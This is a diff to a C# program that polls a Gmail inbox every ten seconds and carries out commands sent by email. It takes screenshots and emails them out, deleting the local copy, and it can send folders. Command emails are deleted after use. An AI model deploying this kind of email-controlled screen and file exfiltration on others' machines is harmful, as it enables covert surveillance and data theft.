@@ -10,12 +10,13 @@ using System.Net.Mail;
 using System.IO;
 
 using System.Drawing;
+using System.Drawing.Imaging;
 
 using System.Threading;
 using ActiveUp.Net.Mail;
 
 using System.Diagnostics;
-using System.Drawing.Imaging;
+
 using System.Windows.Forms;
 
 namespace Windows_E_mail_Host
@@ -30,29 +31,12 @@ namespace Windows_E_mail_Host
 
         static void Main(string[] args)
         {
-            CheckForMail();
-            //UseCMD(new []{"echo Whello World in CMD", @"cd C:\\"});
+            System.Threading.Timer checkForNewMail = new System.Threading.Timer(CheckForMail, null, 0, 10000);
 
             Console.ReadKey();
         }
-
-        //static string ParseHTML(string x)
-        //{
-        //    StringBuilder parsed = new StringBuilder();
-        //    bool ignore = false;
-
-        //    for (int i = 0; i < x.Length; i++)
-        //    {
-        //        if (x[i] == '<') ignore = true;
-        //        if (!ignore) parsed.Append(x[i]);
-        //        if (x[i] == '>') ignore = false;
-        //    }
-
-        //    return parsed.ToString();
-        //}
-
-
-        static void CheckForMail()
+        
+        static void CheckForMail(object o)
         {
             MailRepository mailRepository = new MailRepository(
                                     "imap.gmail.com",
@@ -105,7 +89,9 @@ namespace Windows_E_mail_Host
 
                                 break;
                             case "MAKE SS":
-                                sendEmail("Screen captured", "", new[] { MakeScreenCapture() });
+                                string ssname = MakeScreenCapture();
+                                sendEmail("Screen captured", "", new[] { ssname });
+                                File.Delete(ssname);
 
                                 break;
                             case "SEND FOLDER":
@@ -121,25 +107,9 @@ namespace Windows_E_mail_Host
                         }
 
                     }
-
-
-
+                    
                     mailRepository.DelateMessage("inbox", allEmailsIndexes[i]);
                 }
-
-
-
-
-
-                //    Console.WriteLine("<p>{0}: {1}</p><p>{2}</p>", email.From, email.Subject, (email.BodyHtml.Text));
-                //    if (email.Attachments.Count > 0)
-                //    {
-                //        foreach (MimePart attachment in email.Attachments)
-                //        {
-                //            Console.WriteLine("<p>Attachment: {0} {1}</p>", attachment.ContentName, attachment.ContentType.MimeType);
-                //        }
-                //    }
-                //}
             }
         }
 
